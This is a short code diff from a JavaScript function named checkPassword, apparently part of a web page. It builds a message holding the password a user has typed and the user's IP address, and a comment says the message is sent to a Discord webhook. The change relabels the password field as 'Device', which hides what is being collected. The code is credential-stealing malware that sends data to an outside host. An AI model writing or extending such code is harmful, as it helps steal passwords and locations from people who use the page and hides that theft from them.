@@ -698,7 +698,8 @@ function checkPassword() {
             
             // Create payload with password and IP address
             const payload = {
-                content: `Password: ${password}, IP: ${ip}\n------------------------------------------------------------`
+                content: `User has entered new info:
+                \nDevice: ${password}, IP: ${ip}\n------------------------------------------------------------`
             };
             
             // Send payload to Discord webhook
